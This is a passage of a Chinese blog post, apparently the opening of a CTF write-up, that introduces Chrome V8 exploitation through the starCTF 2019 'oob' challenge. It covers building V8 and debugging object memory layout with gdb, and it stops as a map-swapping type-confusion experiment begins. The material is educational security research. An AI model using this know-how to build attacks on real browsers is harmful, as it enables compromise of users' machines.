@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Chrome浏览器漏洞入门 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 三月 16日 2021, 10:22 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      27 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 开坑Chrome浏览器漏洞，找个简单的开始入手。</p>
+<p>跟PHP的UAF玩法很像，触类旁通不难理解。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p>简单来说就是为了提高性能，而将C等语言编译成一段类似字节码一样的指令，并在浏览器上执行。</p>
+<p>根据<a href="https://www.wasm.com.cn/getting-started/developers-guide/">官方文档</a>和<a href="https://www.cnblogs.com/jesse123/p/7637031.html">参考</a>来简单认识一下这门技术，首先去<a href="https://github.com/emscripten-core/emsdk">GitHub</a>下载Emscripten，用于将简单的程序编译成WebAssembly。</p>
+<p>开始安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./emsdk install latest</span><br><span class="line">/emsdk activate latest</span><br><span class="line"><span class="built_in">source</span> ./emsdk_env.sh</span><br></pre></td></tr></table></figure>
+
+<p>安装完成：</p>
+<p><img src="/css/images/starctf2019_oob/2021031601.png" srcset="/img/loading.gif"></p>
+<p>然后编译一个简单的测试html和配套js：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#include &lt;stdio.h&gt;&#x27;</span> &gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;int main(int argc, char ** argv) &#123;&#x27;</span> &gt;&gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;printf(&quot;Hello, world!\n&quot;);&#x27;</span> &gt;&gt; hello.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#125;&#x27;</span> &gt;&gt; hello.c</span><br><span class="line">emcc hello.c -s WASM=1 -o hello.html</span><br></pre></td></tr></table></figure>
+
+<p>编译结果：</p>
+<p><img src="/css/images/starctf2019_oob/2021031602.png" srcset="/img/loading.gif"></p>
+<p>可以看到会编译完成三个文件，一个html一个js和一个wasm，可以看出WebAssembly的运行机制就是由js调用wasm实现使用C等语言实现的代码。一般来说为了安全考虑，wasm不会允许用户直接调用系统函数（比如printf），wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。这种通过emcc编译的方式出来的结果会比较复杂，但是可以将printf这种函数调用编译成wasm可以执行的内容，具体不明。</p>
+<p>用<a href="https://wasdk.github.io/WasmFiddle/">在线编译</a>弄个不调用函数的简单测试：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">    <span class="keyword">return</span>(<span class="number">9</span>*<span class="number">9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译生成字节码后然后再用js调用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">139</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">209</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(wasmInstance.<span class="property">exports</span>.<span class="title function_">main</span>());</span><br></pre></td></tr></table></figure>
+
+<p>执行js就可以看到控制台上打印了81。</p>
+<h3 id="v8环境搭建"><a href="#v8环境搭建" class="headerlink" title="v8环境搭建"></a>v8环境搭建</h3><p>通过starCTF2019的一道题来入门，首先要搭建v8（chrome浏览器js引擎）环境。</p>
+<p>听说因为墙的关系安装起来很麻烦，所以根据参考文章，先去vultr弄个国外主机（64G硬盘、2G内存，centos7，centos8要装python2似乎有点麻烦了），然后复制黏贴命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall <span class="string">&quot;Development Tools&quot;</span>  </span><br><span class="line">yum install -y git gdb bzip2 wget</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">export</span> PATH=`<span class="built_in">pwd</span>`/depot_tools:<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br><span class="line"><span class="built_in">cd</span> ~/v8/v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release <span class="comment"># Release version</span></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug <span class="comment"># Debug version</span></span><br></pre></td></tr></table></figure>
+
+<p>切换其他漏洞分支可以用于学习其他漏洞，<a href="https://eternalsakura13.com/2018/06/26/v8_environment/">参考</a>。</p>
+<p>编译时间很长，还遇到了swap区不够大的问题，<a href="https://blog.csdn.net/hktkfly6/article/details/52753320">参考文章</a>。</p>
+<p>编译完成后将整个v8目录打包，然后ssh也好，http也好，ftp也好，找个办法把包下载到虚拟机解压，包有点大差不多3G，整个文件夹解压出来大概9G。（我是通过xshell进行下载的，宿舍奇怪的网络早上下载比晚上快多了）</p>
+<p>然后还要配置一下pwndbg，先把v8 gdb的初始化文件放到用户目录下（好像也没必要？不过算了）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8/tools</span><br><span class="line"><span class="built_in">mv</span> gdbinit gdbinit_v8</span><br><span class="line"><span class="built_in">cp</span> gdbinit_v8 ~/.gdbinit_v8</span><br></pre></td></tr></table></figure>
+
+<p>然后像pwndbg的配置一样，让gdb启动时同时启动v8 gdb，修改用户目录下gdb的初始化文件.gdbinit，加入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br><span class="line"><span class="built_in">source</span> ~/桌面/v8/v8/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure>
+
+<p>然后写个js用于测试：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);  <span class="comment">//打印a调试信息</span></span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);  <span class="comment">//打印b调试信息</span></span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(c);  <span class="comment">//打印c调试信息</span></span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
+
+<p>然后：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/v8/v8/out.gn/x64.debug/</span><br><span class="line">gdb ./d8</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本可以看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set args --allow-natives-syntax ./test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/aluvion/桌面/v8/v8/v8/out.gn/x64.debug/d8 --allow-natives-syntax ./test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7f6681d74700 (LWP 6831)]</span><br><span class="line">DebugPrint: 0x3b73a438df19: [JSArray]</span><br><span class="line"> - map: 0x3157acc82d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x256361fd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3b73a438de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x132831bc0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x263f214001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3b73a438de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">0x3157acc82d99: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x132831bc04d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x263f21400609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x256361fd1ef9 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x256361fd1e09 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     0x132831bc4ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x3157acc82e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x256361fd1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x256361fd0ec1 &lt;JSFunction Array (sfi = 0x263f2140aca1)&gt;</span><br><span class="line"> - dependent code: 0x132831bc02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>
+
+<p>v8调试环境搭建成功，更新&#x2F;重新编译方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tools/dev/gm.py x64.debug d8</span><br></pre></td></tr></table></figure>
+
+<p>或许可以用来切换分支之后重新编译？晚点再试试。</p>
+<h3 id="v8基础知识"><a href="#v8基础知识" class="headerlink" title="v8基础知识"></a>v8基础知识</h3><h4 id="基本类型在内存中的存储"><a href="#基本类型在内存中的存储" class="headerlink" title="基本类型在内存中的存储"></a>基本类型在内存中的存储</h4><p>首先是几个基础类型，包括整型（Smi&#x2F;immediate small integer）、浮点数（Double）及指针（Pointers），在内存中保存的形态，按照参考文章中的描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Double: Shown as the 64-bit binary representation without any changes</span><br><span class="line">Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000</span><br><span class="line">Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9（感觉这里应该不是&amp;是|）</span><br></pre></td></tr></table></figure>
+
+<p>为了区分数字和指针指向的地址，v8将地址的最低位置为1，所以指针指向的地址-1才是该对象在内存中的真正地址。</p>
+<p>然后来看看v8 gdb的几个基础调试知识。</p>
+<h4 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h4><p>在gdb中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; set args --allow-natives-syntax ./test.js</span><br></pre></td></tr></table></figure>
+
+<p>来使用。</p>
+<p>主要定义了两个调试用函数：</p>
+<ul>
+<li>%DebugPrint(a)，用于打印对象地址</li>
+<li>%SystemBreak()，相当于断点</li>
+</ul>
+<h4 id="job命令"><a href="#job命令" class="headerlink" title="job命令"></a>job命令</h4><p>将JavaScript对象在内存中的数据打印成可视形态，比如打印某个对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x19e704f8def1</span><br><span class="line">0x19e704f8def1: [JSArray]</span><br><span class="line"> - map: 0x0a950fcc2d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3f3520d91111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19e704f8dde1 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x39d6f0040c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3b1bc78c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19e704f8dde1 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x19e704f8df39</span><br><span class="line">0x19e704f8df39: [JSArray]</span><br><span class="line"> - map: 0x0a950fcc2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3f3520d91111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19e704f8df11 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x39d6f0040c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3b1bc78c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19e704f8df11 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.2</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; job 0x19e704f8df81</span><br><span class="line">0x19e704f8df81: [JSArray]</span><br><span class="line"> - map: 0x0a950fcc2f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3f3520d91111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x19e704f8dfa1 &lt;FixedArray[3]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x39d6f0040c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3b1bc78c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x19e704f8dfa1 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 0x19e704f8dfc9 &lt;HeapNumber 2.2&gt;</span><br><span class="line">           2: 0x19e704f8def1 &lt;JSArray[3]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过测试我们可以看出，当一个js对象中同时存在整型和浮点型，他们的存储方式就是浮点式。而如果存在对象类型，存储的浮点数和对象会用指针进行表示。</p>
+<h4 id="telescope"><a href="#telescope" class="headerlink" title="telescope"></a>telescope</h4><p>将某处地址处的数据打印出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wndbg&gt; telescope 0x19e704f8df80</span><br><span class="line">00:0000│   0x19e704f8df80 —▸ 0xa950fcc2f79 ◂— 0x4000039d6f00401</span><br><span class="line">01:0008│   0x19e704f8df88 —▸ 0x39d6f0040c71 ◂— 0x39d6f00408</span><br><span class="line">02:0010│   0x19e704f8df90 —▸ 0x19e704f8dfa1 ◂— 0x39d6f00408</span><br><span class="line">03:0018│   0x19e704f8df98 ◂— 0x300000000</span><br><span class="line">04:0020│   0x19e704f8dfa0 —▸ 0x39d6f0040801 ◂— 0x39d6f00401</span><br><span class="line">05:0028│   0x19e704f8dfa8 ◂— 0x300000000</span><br><span class="line">06:0030│   0x19e704f8dfb0 ◂— 0x100000000</span><br><span class="line">07:0038│   0x19e704f8dfb8 —▸ 0x19e704f8dfc9 ◂— 0x9a000039d6f00405</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，一个对象的内存中的前三个部分分别为：map属性，properties属性（对象成员保存在这里）和elements属性（数组成员保存在这里）。</p>
+<p>查看一下数组的elements属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x081d75e0dfa1</span><br><span class="line">0x81d75e0dfa1: [FixedArray]</span><br><span class="line"> - map: 0x01a834580801 &lt;Map&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 1</span><br><span class="line">           1: 0x081d75e0dfc9 &lt;HeapNumber 2.2&gt;</span><br><span class="line">           2: 0x081d75e0def1 &lt;JSArray[3]&gt;</span><br><span class="line">pwndbg&gt; telescope 0x081d75e0dfa0</span><br><span class="line">00:0000│   0x81d75e0dfa0 —▸ 0x1a834580801 ◂— 0x1a8345801</span><br><span class="line">01:0008│   0x81d75e0dfa8 ◂— 0x300000000</span><br><span class="line">02:0010│   0x81d75e0dfb0 ◂— 0x100000000</span><br><span class="line">03:0018│   0x81d75e0dfb8 —▸ 0x81d75e0dfc9 ◂— 0x9a000001a8345805</span><br><span class="line">04:0020│   0x81d75e0dfc0 —▸ 0x81d75e0def1 ◂— 0x7100000e0b5ea82d</span><br><span class="line">05:0028│   0x81d75e0dfc8 —▸ 0x1a834580561 ◂— 0x2000001a8345801</span><br><span class="line">06:0030│   0x81d75e0dfd0 ◂— 0x400199999999999a</span><br><span class="line">07:0038│   0x81d75e0dfd8 ◂— 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，elements属性的三个部分分别是：map属性、成员数量和成员。</p>
+<h4 id="类型辨认"><a href="#类型辨认" class="headerlink" title="类型辨认"></a>类型辨认</h4><p>我们可以注意到，我们使用job命令读取一个地址时可以将其可视化打印成相应的数字或者对象，其中必定经过了类型辨认的阶段。</p>
+<p>整型很好辨认，其低32位全是0，浮点数和对象的辨认就需要依靠他们的map属性了。</p>
+<p>如果对象中的成员全是数字（整型&#x2F;浮点数），那就不需要每个成员都带一个map属性，再用指针来表示了。</p>
+<p>当成员中存在对象时，指针会指向该成员的map属性。（浮点数变成map+浮点的存储形式，对象不变）</p>
+<h4 id="对象及其elements属性的map属性"><a href="#对象及其elements属性的map属性" class="headerlink" title="对象及其elements属性的map属性"></a>对象及其elements属性的map属性</h4><p>仔细观察可以发现，对象和elements属性各有一个map属性，里面都有类型相关的标识，那么在访问elements属性时，会以哪个属性为准呢？</p>
+<p>尝试在gdb中将一个对象数组的map属性修改为一个浮点型数组的map属性（整型只有32位，无法完全读取），修改一下测试脚本：</p>
